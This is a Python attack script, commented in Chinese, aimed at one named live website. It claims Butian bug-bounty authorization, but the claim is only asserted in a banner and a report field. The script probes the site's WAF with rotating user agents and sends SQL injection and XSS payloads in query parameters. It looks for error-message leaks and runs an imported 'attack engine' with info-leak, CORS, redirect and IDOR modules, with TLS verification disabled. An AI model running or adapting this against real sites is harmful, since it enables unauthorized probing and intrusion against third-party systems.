#!/usr/bin/env python3
"""
目标安全测试脚本 - 针对 https://www.lzdxdyyy.com/Web/Ldyy
补天平台授权测试
"""
import sys
import os
import requests
import urllib3
import time
import json
from datetime import datetime
from pathlib import Path

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 添加项目路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

TARGET = "https://www.lzdxdyyy.com/Web/Ldyy"
REPORT_DIR = Path("reports")
REPORT_DIR.mkdir(exist_ok=True)

# WAF绕过常用的User-Agent列表
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]


def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════╗
║           目标安全测试 - 补天平台授权测试                    ║
║  Target: https://www.lzdxdyyy.com/Web/Ldyy                  ║
║  Authorization: 补天平台已授权                               ║
╚══════════════════════════════════════════════════════════════╝
    """)


def test_waf_bypass():
    """测试WAF绕过"""
    print("\n[Phase 1] WAF探测与绕过测试")
    print("=" * 60)
    
    results = []
    parsed_url = requests.utils.urlparse(TARGET)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # 测试1: 不同的User-Agent
    print("\n[1.1] User-Agent变换测试")
    for i, ua in enumerate(USER_AGENTS[:3]):  # 只测试前3个
        try:
            resp = requests.get(
                TARGET,
                headers={"User-Agent": ua},
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            status = resp.status_code
            waf_triggered = "WAF防护" in resp.text or status == 510
            print(f"  UA #{i+1}: Status={status}, WAF={'是' if waf_triggered else '否'}")
            results.append({
                "test": f"UA_{i+1}",
                "user_agent": ua[:50] + "...",
                "status": status,
                "waf_triggered": waf_triggered
            })
        except Exception as e:
            print(f"  UA #{i+1}: 错误 - {str(e)[:50]}")
        time.sleep(0.5)
    
    # 测试2: 路径探测
    print("\n[1.2] 路径探测")
    paths_to_test = [
        "/Web/Ldyy",
        "/Web/Ldyy/",
        "/Web/Ldyy?id=1",
        "/",
        "/robots.txt",
    ]
    for path in paths_to_test:
        try:
            url = base_url + path
            resp = requests.get(url, timeout=10, verify=False)
            status = resp.status_code
            length = len(resp.text)
            print(f"  {path}: Status={status}, Length={length}")
            results.append({"test": f"Path_{path}", "status": status, "length": length})
        except Exception as e:
            print(f"  {path}: 错误 - {str(e)[:50]}")
        time.sleep(0.3)
    
    return results


def test_information_disclosure():
    """信息泄露测试"""
    print("\n[Phase 2] 信息泄露测试")
    print("=" * 60)
    
    findings = []
    
    # 测试响应头信息泄露
    print("\n[2.1] 响应头分析")
    try:
        resp = requests.get(TARGET, timeout=10, verify=False)
        headers = dict(resp.headers)
        
        interesting_headers = [
            "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
            "X-Generator", "X-Drupal-Cache", "X-Varnish", "Via",
            "X-Runtime", "X-Request-Id", "X-Upstream", "X-Debug"
        ]
        
        for h in interesting_headers:
            if h.lower() in {k.lower() for k in headers.keys()}:
                for k, v in headers.items():
                    if k.lower() == h.lower():
                        print(f"  [!] {k}: {v}")
                        findings.append({"type": "header_leak", "header": k, "value": v})
        
        # 显示所有响应头
        print("\n  所有响应头:")
        for k, v in headers.items():
            print(f"    {k}: {v}")
    except Exception as e:
        print(f"  错误: {e}")
    
    # 测试错误页面信息泄露
    print("\n[2.2] 错误页面测试")
    error_paths = [
        "/Web/Ldyy?page='",
        "/Web/Ldyy?id=1'",
        "/Web/Ldyy?search=<script>alert(1)</script>",
    ]
    for path in error_paths:
        try:
            url = f"https://www.lzdxdyyy.com{path}"
            resp = requests.get(url, timeout=10, verify=False)
            
            # 检查常见错误特征
            error_patterns = [
                "SQL", "MySQL", "PostgreSQL", "ORA-", "SQLite",
                "stack trace", "Stack Trace", "Exception",
                "Debug", "DEBUG", "Error", "ERROR",
                "Warning", "warning", "Parse error",
                "Line \\d+", "File \"", "in /",
                "Apache/", "nginx/", "PHP/",
            ]
            
            body_lower = resp.text.lower()
            for pattern in error_patterns:
                if pattern.lower() in body_lower:
                    print(f"  [!] 发现错误信息泄露: {path}")
                    print(f"      特征: {pattern}")
                    findings.append({
                        "type": "error_disclosure",
                        "path": path,
                        "pattern": pattern
                    })
                    break
        except Exception as e:
            pass
        time.sleep(0.3)
    
    return findings


def test_common_vulnerabilities():
    """常见漏洞测试"""
    print("\n[Phase 3] 常见漏洞探测")
    print("=" * 60)
    
    findings = []
    
    # SQL注入测试
    print("\n[3.1] SQL注入测试")
    sqli_payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "1' AND '1'='1",
    ]
    for payload in sqli_payloads:
        try:
            url = f"https://www.lzdxdyyy.com/Web/Ldyy?id={payload}"
            resp = requests.get(url, timeout=10, verify=False)
            sql_errors = ["SQL", "MySQL", "PostgreSQL", "ORA-", "SQLite", "syntax error"]
            for error in sql_errors:
                if error.lower() in resp.text.lower():
                    print(f"  [!] 潜在SQL注入: {payload[:30]}...")
                    findings.append({"type": "sqli", "payload": payload})
                    break
        except:
            pass
        time.sleep(0.3)
    
    # XSS测试
    print("\n[3.2] XSS测试")
    xss_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
    ]
    for payload in xss_payloads:
        try:
            url = f"https://www.lzdxdyyy.com/Web/Ldyy?q={payload}"
            resp = requests.get(url, timeout=10, verify=False)
            if payload in resp.text:
                print(f"  [!] 潜在XSS: {payload[:30]}...")
                findings.append({"type": "xss", "payload": payload})
        except:
            pass
        time.sleep(0.3)
    
    return findings


def run_attack_engine():
    """运行项目自带的攻击引擎"""
    print("\n[Phase 4] 运行攻击引擎模块")
    print("=" * 60)
    
    try:
        from secops_offense.attack_engine.engine import AttackEngine
        from secops_offense.attack_engine.auth import set_authorized
        
        # 设置授权
        set_authorized(TARGET)
        
        # 创建引擎实例
        engine = AttackEngine(TARGET)
        
        # 运行检测（跳过需要交互的模块）
        print("\n  启动攻击引擎...")
        findings = engine.run_all(modules=["infoleak", "cors", "redirect", "idor"])
        
        # 输出报告
        engine.report()
        
        # 保存报告
        json_path, md_path = engine.save_report()
        
        return findings
    except Exception as e:
        print(f"  攻击引擎执行错误: {e}")
        import traceback
        traceback.print_exc()
        return []


def generate_report(waf_results, info_findings, vuln_findings, engine_findings):
    """生成综合报告"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = REPORT_DIR / f"security_test_{timestamp}.json"
    
    report = {
        "target": TARGET,
        "timestamp": datetime.now().isoformat(),
        "authorization": "补天平台授权",
        "summary": {
            "waf_tests": len(waf_results),
            "info_disclosure_findings": len(info_findings),
            "vulnerability_findings": len(vuln_findings),
            "engine_findings": len(engine_findings),
        },
        "waf_analysis": waf_results,
        "info_disclosure": info_findings,
        "vulnerabilities": vuln_findings,
        "engine_results": engine_findings,
    }
    
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    
    print(f"\n[报告已保存] {report_file}")
    return report_file


def main():
    print_banner()
    
    # Phase 1: WAF探测
    waf_results = test_waf_bypass()
    
    # Phase 2: 信息泄露
    info_findings = test_information_disclosure()
    
    # Phase 3: 常见漏洞
    vuln_findings = test_common_vulnerabilities()
    
    # Phase 4: 攻击引擎
    engine_findings = run_attack_engine()
    
    # 生成报告
    report_file = generate_report(waf_results, info_findings, vuln_findings, engine_findings)
    
    # 打印摘要
    print("\n" + "=" * 60)
    print("测试完成 - 摘要")
    print("=" * 60)
    print(f"WAF测试: {len(waf_results)} 项")
    print(f"信息泄露发现: {len(info_findings)} 项")
    print(f"漏洞发现: {len(vuln_findings)} 项")
    print(f"引擎发现: {len(engine_findings)} 项")
    print(f"详细报告: {report_file}")
    print()


if __name__ == "__main__":
    main()
